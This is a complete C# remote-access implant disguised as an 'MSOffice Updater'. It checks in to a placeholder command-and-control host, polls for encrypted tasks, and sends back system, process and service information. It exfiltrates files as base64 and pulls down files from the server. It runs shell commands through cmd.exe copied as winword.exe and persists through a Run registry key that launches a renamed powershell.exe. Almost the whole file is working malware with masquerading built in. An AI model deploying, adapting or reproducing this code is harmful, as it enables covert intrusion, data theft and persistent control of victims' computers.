using System;
using System.Timers;
using System.Net;
using Microsoft.Win32;
using System.Management;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Threading;
using System.IO;
using System.Text;
using System.ServiceProcess;
using AddressFamily = System.Net.Sockets.AddressFamily;
using System.DirectoryServices.ActiveDirectory;
using System.Net.Http;
using System.Threading.Tasks;


namespace MSOffice
{
    
    public class Updater
    {
        
        
        static string c2host = "https://your.c2.or.redirector.goes.here.com";
        static string c2fileName = "/submit.php?id=8675309";
        static string xaes_key = "AAAAAAAAAAAAAAAA"; 
        static string xaes_iv = "BBBBBBBBBBBBBBBB";
        
        static string hostname = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
        static string username = Environment.GetEnvironmentVariable("USERNAME");
        static int guid = Util.GetRandom();


        public static void Main()
        {
            
            string domainName = string.Empty;

            try 
            {
                domainName = Domain.GetComputerDomain().ToString();
            }

            catch 
            {

            }

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    
                    string ipAddr = ip.ToString();    
                    Checkin(hostname, guid, ipAddr, domainName, username);
                    

                }
            

            }


            

            System.Timers.Timer timer = new System.Timers.Timer(TimeSpan.FromMinutes(.05).TotalMilliseconds);
            timer.AutoReset = true;
            timer.Elapsed += new System.Timers.ElapsedEventHandler(RepeatThis);
            timer.Start();
            Console.ReadLine();
            
            
        }
        

        public static void RepeatThis(object sender, ElapsedEventArgs e)
        {
            
            try
            {
                GetTask();
            }

            catch
            {
                
            }
            
        }


        public static class Util
        {
            private static Random rnd = new Random();
            public static int GetRandom()
            {
                return rnd.Next();
            }

        }

       

        public static void GetTask()
        {
            
            try

            {
                
                var TaskToRun = string.Empty;
                
                WebRequest request = WebRequest.Create(c2host + guid + c2fileName);
                request.Credentials = CredentialCache.DefaultCredentials;
                WebResponse response = request.GetResponse();
                //Console.WriteLine(((HttpWebResponse)response).StatusDescription);
                
                using (Stream dataStream = response.GetResponseStream())
                {
                    
                    StreamReader reader = new StreamReader(dataStream);
                    
                    string responseFromServer = reader.ReadToEnd();
                    
                    TaskToRun = responseFromServer;
                    //Console.WriteLine(TaskToRun);

                }

                response.Close();
                
                string DecryptedTaskToRun = DecryptAES(TaskToRun);
                
                if (DecryptedTaskToRun == "null")
                    
                    {
                        return;
                    }

                if (DecryptedTaskToRun.Contains("dir"))
                    
                    {
                        DirModule(DecryptedTaskToRun);
                    }

                if (DecryptedTaskToRun.Contains("runningTasks"))
                    
                    {
                        RunningTasksModule();
                    }

                if (DecryptedTaskToRun.Contains("runningServices"))
                    
                    {
                        RunningServicesModule();
                    }

                if (DecryptedTaskToRun.Contains("serviceInfo"))
                    
                    {
                        ServiceInfoModule(DecryptedTaskToRun);
                    }

                if (DecryptedTaskToRun.Contains("download"))
                    
                    {
                        DownloadModule(DecryptedTaskToRun);
                    }

                if (DecryptedTaskToRun.Contains("persist"))
                    
                    {
                        PModule(DecryptedTaskToRun);
                    }

                if (DecryptedTaskToRun.Contains("copy"))
                    
                    {
                        CopyFileModule(DecryptedTaskToRun);
                    }

                if (DecryptedTaskToRun.Contains("upload"))
                    
                    {
                        Upload(DecryptedTaskToRun);
                    }
                if (DecryptedTaskToRun.Contains("shell"))
                    
                    {
                        Shell(DecryptedTaskToRun);
                    }

            }

            catch (WebException ex)
            {

                //Console.WriteLine("GetTask() Error: {0}", ex.Message);
                        
                Post(ex.Message);
                Main();
            }


        }

        
        private static void Checkin(string xHostname, int xuID, string xipAddr, string xdomainName, string xUsername)
        {

            try
            {

                Console.WriteLine("Update process started...");

                ServicePointManager.Expect100Continue = false;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                
                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
                
                byte[] encrypted = EncryptStringToBytes(xHostname, aes_key, aes_iv);

                
                string str_encrypted = EncryptAES(xHostname + "," + guid + "," + xipAddr + "," + xdomainName + "," + xUsername);

                //Console.WriteLine("Encrypted: {0}", str_encrypted);

                var request = (HttpWebRequest)WebRequest.Create(c2host + "checkin");
                var postData = Uri.EscapeDataString(str_encrypted);
                var data = Encoding.ASCII.GetBytes(postData);

                 
                request.Method = "POST";
                request.ContentType = "text/plain";
                request.ContentLength = data.Length;

                try {

                        using (var stream = request.GetRequestStream())
                        {
                         stream.Write(data, 0, data.Length);
                        }

                        var response = (HttpWebResponse)request.GetResponse();
                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();

                        
                        GetTask();
                     
                    }

                catch (Exception e)
                    {
                        
                        Console.WriteLine("Error1: {0}", e.Message);
                        
                        //Post(e.Message);
                        return;
                    }

                finally 
                    {
                        //Main();
                    }


                
            }
            catch (Exception e)
            {
                Post(e.Message);
                Console.WriteLine("Error2: {0}", e.Message);
            }


            
        }


        
        private static void Shell(string xArg)
        {

            try
            {

                File.Copy(@"c:\windows\system32\cmd.exe", @"c:\users\" + username + @"\AppData\roaming\Microsoft\Word\winword.exe", true);
                
                xArg = xArg.Substring(xArg.IndexOf(' ') + 1);
                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                processStartInfo.FileName = @"c:\users\" + username + @"\AppData\roaming\Microsoft\Word\winword.exe";
                processStartInfo.Arguments = "/c" + xArg;

                processStartInfo.CreateNoWindow = true;
                processStartInfo.UseShellExecute = false;           
                processStartInfo.RedirectStandardOutput = true;

                Process process = new Process();
                process.StartInfo = processStartInfo;
                
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                
                //Console.Write(output);
                Post(output);
                
            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                //Console.WriteLine("finally block in ShellModule");
            }



        }

        private static void PModule(string xLocationOfImp)
        {

            try
            {


                try
                {
                    string sourceFile = @"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe";
                    string destinationFile = @"c:\users\" + username + @"\AppData\roaming\Microsoft\Excel\Excel.exe"; 
                    File.Copy(sourceFile, destinationFile, true);  
                }

                catch (Exception e)
                {
                    //Console.WriteLine("Error: {0}", e.Message);
                    Post(e.Message);
                }



                try
                {
                    
                    string splitter = xLocationOfImp;
                    string[] vars = splitter.Split(' ');
                    string location = vars[1];

                    string key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
                    Registry.SetValue(key, "Microsoft Office Update", @"c:\users\" + username + @"\AppData\roaming\Microsoft\Excel\Excel.exe -windowstyle hidden [System.Reflection.Assembly]::LoadFile('" + location + "');[MSOffice.Updater]::Main()");
                    Post("Task completed");
                }

                catch (Exception e)
                {
                    //Console.WriteLine("registry Error: {0}", e.Message);
                    Post(e.Message);
                }

            }

            catch (Exception e)
            {
                
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

        }

        private static void Upload(string xUpload)
        {
            
            //Console.WriteLine(xUpload);

            string FirstSplit = xUpload;
            string[] vars = FirstSplit.Split(' ');
            string a = vars[0];
            string b = vars[1];
            string c = vars[2];

            string SecondSplit = FirstSplit;
            string[] vars2 = SecondSplit.Split('\\');
            string x = vars2[0];
            string y = vars2[1];
            string fileName = vars2[2];

            string fileUrl = c2host + guid + "/receiver/" + fileName;
            
            string file = fileName;

            var buffer = new byte[80 * 1024];

            ServicePointManager.Expect100Continue = false;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

            var client=new HttpClient();
            var response = client.GetAsync(fileUrl, HttpCompletionOption.ResponseHeadersRead);
            if (response.Result.IsSuccessStatusCode)
            {
                var stream = response.Result.Content.ReadAsStreamAsync().Result;

                var finfo = new FileInfo(file);

                if (finfo.Directory == null)
                {
                    //Console.WriteLine("Wrong file path!");
                    return;
                }

                if (!finfo.Directory.Exists) finfo.Directory.Create();

                //Console.WriteLine("Downloading data ...");
                using (var wrtr = new FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None, buffer.Length))
                {
                    var read=0;
                    while ((read = stream.Read(buffer, 0, buffer.Length)) > 0) 
                    {
                        wrtr.Write(buffer,0,read);
                    }
                    wrtr.Flush();
                    wrtr.Close();
                }

                //Console.WriteLine("Data downloaded");

                stream.Close();
                Post("Task Completed");
            }
            else
            {
                //Console.WriteLine("error");
            }
        }
        
        


        private static void CopyFileModule(string xSD)
        {

            
            try
            {
                
                //string s = string.Empty;
                string splitter = xSD;
                string[] vars = splitter.Split(' ');

                string sourceFile = vars[1];
                string destinationFile = vars[2];

                

                File.Copy(sourceFile, destinationFile, true);
                Post(sourceFile + " copied to " + destinationFile);


            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                //Console.WriteLine("finally block in dirModule");
            }


        }



        private static void DirModule(string xDir)
        {

            try
            {
                
                xDir = xDir.Substring(xDir.IndexOf(' ') + 1);
                var targetDirectory = xDir;
                string[] fileEntries = Directory.GetFileSystemEntries(targetDirectory);
                string results = string.Empty;

                foreach(var fileName in fileEntries)
                    results += "\n" + fileName;

                //Console.WriteLine(results);
                Post(results);

            }

            catch (Exception e)
            {
                Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                //Console.WriteLine("finally block in dirModule");
            }


        }

        private static void RunningTasksModule()
        {

            try
            {
                
                var ProcList = Process.GetProcesses();
                string results = string.Empty;

                foreach(var proc in ProcList)
                    results += "\n" + "Process Name: " + proc.ProcessName + ", " + "PID: " + proc.Id;

                //Console.WriteLine(results);

                Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                
            }


        }

        private static void RunningServicesModule()
        {

            try
            {
                
                var sController = ServiceController.GetServices();
                string results = string.Empty;

                foreach (var sc in sController)
                    results += "\n" + sc.ServiceName;
                
                //Console.WriteLine(results);

                Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                //Console.WriteLine("finally block in RunningServicesModule");
            }


        }

        private static void ServiceInfoModule(string xService)
        {

            try
            {
                
                xService = xService.Substring(xService.IndexOf(' ') + 1);
                string serviceName = xService;
                string results = string.Empty;                
                
                using (ManagementObject wmiService = new ManagementObject("Win32_Service.Name='"+ serviceName +"'"))
                {
                    wmiService.Get();
                    string n = wmiService["Name"].ToString();
                    string d = wmiService["Description"].ToString();
                    string s1 = wmiService["State"].ToString();
                    string s2 = wmiService["Status"].ToString();
                    string p = wmiService["PathName"].ToString();
                    
                    results = "\n" + "Name: " + n +
                              "\n" + "Description: " + d +
                              "\n" + "State: " + s1 +
                              "\n" + "Status: " + s2 +
                              "\n" + "PathName: " + p;
                    //Console.WriteLine(results);


                }

                Post(results);

            }

            catch (Exception e)
            {
                //Console.WriteLine("Error: {0}", e.Message);
                Post(e.Message);
            }

            finally
            {
                //Console.WriteLine("finally block in ServiceInfoModule");
            }


        }

        private static void DownloadModule(string xDownload)
        {

            //Console.WriteLine("Hello from DownloadModule");

            try
            {    
                
                xDownload = xDownload.Substring(xDownload.IndexOf(' ') + 1);
                var fileName = xDownload;
                //Console.WriteLine("testing " + fileName);
                
                byte[] bytes = File.ReadAllBytes(fileName);
                string base64 = System.Convert.ToBase64String(bytes);
                
                string tmpFile = fileName + ".tmp";

                File.WriteAllText (tmpFile, base64);

                
                var formContent = new MultipartFormDataContent
                    {
                        { new ByteArrayContent(File.ReadAllBytes(tmpFile)), "file", Path.GetFileName(tmpFile) }
                    };

                var client = new HttpClient();
                var response = client.PostAsync(c2host + "/api", formContent).Result;
                //return;
                Post("Task completed");

                    //File.Delete(tmpFile);
            }

            catch
            {
                //Console.WriteLine("Testing");
            }   


        }


 
        private static void Post(string ResultsToPost)
        {

            try
            {

                ServicePointManager.Expect100Continue = false;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                
                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);
                
                byte[] encrypted = EncryptStringToBytes(ResultsToPost, aes_key, aes_iv);

                // Encrypt the string to an array of bytes.
                string str_encrypted = EncryptAES("[" + guid + "] " + ResultsToPost);

                //Console.WriteLine("Encrypted: {0}", str_encrypted);

                var request = (HttpWebRequest)WebRequest.Create(c2host + "results");
                var postData = Uri.EscapeDataString(str_encrypted);
                var data = Encoding.ASCII.GetBytes(postData);

                 
                request.Method = "POST";
                request.ContentType = "text/plain";
                request.ContentLength = data.Length;

                try {

                        using (var stream = request.GetRequestStream())
                        {
                         stream.Write(data, 0, data.Length);
                        }

                        var response = (HttpWebResponse)request.GetResponse();
                        var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                     
                    }

                catch (Exception)
                    {
                        //Post(e.Message);
                        //Console.WriteLine("Error: {0}", e.Message);
                        return;
                    }
                
            }
            catch (Exception e)
            {
                Post(e.Message);
                //Console.WriteLine("Error: {0}", e.Message);
            }

            
        }

        


        public static string EncryptAES(string plainText)
        {
            byte[] encrypted;

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {

                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);

                aes.Key = aes_key;
                aes.IV = aes_iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform enc = aes.CreateEncryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, enc, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }

                        encrypted = ms.ToArray();
                    }
                }
            }

            return Convert.ToBase64String(encrypted);
        }

        static byte[] EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
        {
            
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("Key");
            byte[] encrypted;
         
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);

                
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {

                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            return encrypted;

        }


        public static string DecryptAES(string encryptedText)
        {
            string decrypted = null;
            byte[] cipher = Convert.FromBase64String(encryptedText);

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                byte[] aes_key = Encoding.ASCII.GetBytes(xaes_key);
                byte[] aes_iv = Encoding.ASCII.GetBytes(xaes_iv);

                aes.Key = aes_key;
                aes.IV = aes_iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform dec = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, dec, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            decrypted = sr.ReadToEnd();
                        }
                    }
                }
            }

            return decrypted;
        }


        static string DecryptStringFromBytes(byte[] cipherText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("Key");

            string plaintext = null;

            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;

        }






    }
}
